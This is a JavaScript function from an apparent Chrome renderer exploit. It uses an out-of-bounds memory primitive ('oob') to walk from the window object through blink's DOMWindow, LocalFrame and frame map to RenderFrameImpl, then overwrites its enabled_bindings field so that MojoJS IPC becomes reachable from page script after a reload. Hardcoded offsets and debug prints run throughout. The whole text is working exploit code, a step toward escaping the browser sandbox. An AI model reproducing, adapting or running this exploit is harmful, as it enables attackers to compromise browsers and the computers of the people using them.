function enable_mojo(oob) {
  print('[enable_mojo]');

  let window_ptr = oob.objToPtr(window);
  print('  [*] window_ptr:        0x' + window_ptr.toString(16));
  //oob.hexdump(window_ptr, 0x48);

  const kDOMWindowOffset = 0x28n;
  // blink::DOMWindow
  let dom_window_ptr = oob.getUint64(window_ptr + kDOMWindowOffset);
  print('  [*] dom_window_ptr:    0x' + dom_window_ptr.toString(16));
  //oob.hexdump(dom_window_ptr, 0x100);

  const kFrameOffset = 0x50n;
  // blink::LocalFrame
  let frame_ptr = oob.getUint64(dom_window_ptr + kFrameOffset);
  print('  [*] frame_ptr:         0x' + frame_ptr.toString(16));
  //oob.hexdump(frame_ptr, 0x100);

  const kFrameMapDelta = 0x7ffd7f348998n - 0x7ffd7eba2390n;
  let frame_map_ptr = oob.getUint64(frame_ptr) + kFrameMapDelta;

  // g_frame_map is a lazy instance, first element should be a pointer to the
  // actual map instance, which will be directly following
  if (oob.getUint64(frame_map_ptr) != frame_map_ptr + 0x8n) {
    print('  [!] error finding g_frame_map');
    return;
  }

  frame_map_ptr += 0x8n;
  print('  [*] frame_map_ptr:     0x' + frame_map_ptr.toString(16));
  //oob.hexdump(frame_map_ptr, 0x100);

  let begin_ptr = oob.getUint64(frame_map_ptr);
  print('  [*] begin_ptr:         0x' + begin_ptr.toString(16));
  //oob.hexdump(begin_ptr, 0x30);

  //print(oob.getUint64(begin_ptr + 0x20n).toString(16));

  // this is an std::map, which is structured as an RBTree
  // TODO: traverse map properly or call the static function.
  //if (oob.getUint64(begin_ptr + 0x20n) != web_frame_ptr) {
  //  print('[!] error finding RenderFrameImpl');
  //  return;
  //}

  let node_ptr = oob.getUint64(begin_ptr + 0x8n);
  print('  [*] node_ptr:          0x' + node_ptr.toString(16));
  //oob.hexdump(node_ptr, 0x30);
  
  // blink::RenderFrameImpl
  render_frame_ptr = oob.getUint64(node_ptr + 0x28n);
  print('  [*] render_frame_ptr:  0x' + render_frame_ptr.toString(16));
  //oob.hexdump(render_frame_ptr, 0x800);

  const kEnabledBindingsOffset = 0x6f0n;
  let enabled_bindings = oob.getUint32(render_frame_ptr + kEnabledBindingsOffset);
  print('  [*] enabled_bindings:  0x' + enabled_bindings.toString(2));
  oob.setUint32(render_frame_ptr + kEnabledBindingsOffset, 2);

  oob.cleanup();

  print('  [*] reloading');
  window.location.reload();
}
